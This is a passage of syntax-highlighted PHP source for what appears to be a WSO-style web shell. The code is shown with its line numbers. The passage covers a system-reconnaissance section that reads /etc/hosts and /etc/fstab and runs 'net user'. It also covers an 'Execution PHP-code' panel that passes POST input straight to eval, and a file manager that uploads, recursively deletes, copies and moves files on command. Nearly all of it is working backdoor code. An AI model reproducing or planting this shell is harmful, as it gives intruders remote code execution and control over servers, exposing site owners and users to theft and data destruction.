<span class="lineno"> 420</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 421</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 422</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 423</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
<span class="lineno"> 424</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 425</span>             <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> 
<span class="lineno"> 426</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>  
<span class="lineno"> 427</span>                 <span class="k">if</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="nv">$temp</span><span class="p">[]</span><span class="o">=</span><span class="nv">$item</span><span class="p">;}</span> 
<span class="lineno"> 428</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span> 
<span class="lineno"> 429</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;br/&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 430</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span> 
<span class="lineno"> 431</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span> 
<span class="lineno"> 432</span>             <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Mount options&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/fstab&#39;</span><span class="p">));</span> 
<span class="lineno"> 433</span>         <span class="p">}</span> 
<span class="lineno"> 434</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 435</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>  
<span class="lineno"> 436</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>  
<span class="lineno"> 437</span>         <span class="nx">showSecParam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span><span class="nx">ex</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span> 
<span class="lineno"> 438</span>     <span class="p">}</span> 
<span class="lineno"> 439</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 440</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 441</span> <span class="p">}</span> 
<span class="lineno"> 442</span> 
<span class="lineno"> 443</span> <span class="k">function</span> <span class="nf">actionPhp</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 444</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 445</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 446</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 447</span>         <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 448</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;PhpOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;PhpOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 449</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 450</span>         <span class="k">exit</span><span class="p">;</span>  
<span class="lineno"> 451</span>     <span class="p">}</span> 
<span class="lineno"> 452</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 453</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 454</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 455</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 456</span>         <span class="nb">phpinfo</span><span class="p">();</span> 
<span class="lineno"> 457</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 458</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!body {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 459</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!a:\w+ {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 460</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!h1!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;h2&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 461</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 462</span>         <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!body, td, th, h2, h2 {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno"> 463</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span> 
<span class="lineno"> 464</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 465</span>     <span class="p">}</span> 
<span class="lineno"> 466</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 467</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 468</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\&#39;\&#39;);}return false;&quot;&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 469</span>     <span class="k">echo</span> <span class="s1">&#39; &lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;margin-top:5px;&quot; class=ml1&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 470</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 471</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 472</span>         <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 473</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span> 
<span class="lineno"> 474</span>     <span class="p">}</span> 
<span class="lineno"> 475</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 476</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 477</span> <span class="p">}</span> 
<span class="lineno"> 478</span> 
<span class="lineno"> 479</span> <span class="k">function</span> <span class="nf">actionFilesMan</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 480</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 481</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 482</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 483</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 484</span>             <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span> 
<span class="lineno"> 485</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> 
<span class="lineno"> 486</span>                     <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span> 
<span class="lineno"> 487</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 488</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 489</span>             <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span> 
<span class="lineno"> 490</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> 
<span class="lineno"> 491</span>                     <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span> 
<span class="lineno"> 492</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 493</span>             <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span> 
<span class="lineno"> 494</span>                 <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 495</span>                     <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span><span class="o">:</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno"> 496</span>                     <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 497</span>                     <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 498</span>                         <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$item</span><span class="p">;</span> 
<span class="lineno"> 499</span>                         <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 500</span>                             <span class="k">continue</span><span class="p">;</span> 
<span class="lineno"> 501</span>                         <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 502</span>                         <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span> 
<span class="lineno"> 503</span>                             <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 504</span>                         <span class="k">else</span> 
<span class="lineno"> 505</span>                             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno"> 506</span>                     <span class="p">}</span> 
<span class="lineno"> 507</span>                     <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span> 
<span class="lineno"> 508</span>                     <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 509</span>                 <span class="p">}</span> 
<span class="lineno"> 510</span>                 <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> 
<span class="lineno"> 511</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 512</span>                         <span class="nv">$f</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 513</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> 
<span class="lineno"> 514</span>                             <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 515</span>                         <span class="k">else</span> 
<span class="lineno"> 516</span>                             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 517</span>                     <span class="p">}</span> 
<span class="lineno"> 518</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 519</span>             <span class="k">case</span> <span class="s1">&#39;paste&#39;</span><span class="o">:</span> 
<span class="lineno"> 520</span>                 <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 521</span>                     <span class="k">function</span> <span class="nf">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span> 
<span class="lineno"> 522</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span> 
<span class="lineno"> 523</span>                             <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 524</span>                             <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 525</span>                             <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 526</span>                                 <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 527</span>                                     <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
<span class="lineno"> 528</span>                                 <span class="p">}</span> 
<span class="lineno"> 529</span>                         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 530</span>                             <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 531</span>                         <span class="p">}</span> 
<span class="lineno"> 532</span>                     <span class="p">}</span> 
<span class="lineno"> 533</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 534</span>                         <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">],</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>                     
<span class="lineno"> 535</span>                 <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 536</span>                     <span class="k">function</span> <span class="nf">move_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span> 
<span class="lineno"> 537</span>                         <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span> 
<span class="lineno"> 538</span>                             <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 539</span>                             <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 540</span>                             <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> 
<span class="lineno"> 541</span>                                 <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 542</span>                                     <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span> 
<span class="lineno"> 543</span>                                 <span class="p">}</span> 
<span class="lineno"> 544</span>                         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 545</span>                             <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span> 
<span class="lineno"> 546</span>                         <span class="p">}</span> 
<span class="lineno"> 547</span>                     <span class="p">}</span> 
<span class="lineno"> 548</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 549</span>                         <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 550</span>                 <span class="p">}</span> 
<span class="lineno"> 551</span>                 <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span> 
<span class="lineno"> 552</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 553</span>             <span class="k">default</span><span class="o">:</span> 
<span class="lineno"> 554</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span><span class="o">||</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 555</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span> 
<span class="lineno"> 556</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span> 
<span class="lineno"> 557</span>                     <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$f</span><span class="p">)</span> 
<span class="lineno"> 558</span>                         <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> 
<span class="lineno"> 559</span>                     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span> 
<span class="lineno"> 560</span>                 <span class="p">}</span> 
<span class="lineno"> 561</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 562</span>         <span class="p">}</span> 
<span class="lineno"> 563</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;script&gt;document.mf.p1.value=&quot;&quot;;document.mf.p2.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 564</span>     <span class="p">}</span> 
<span class="lineno"> 565</span>     <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">:</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
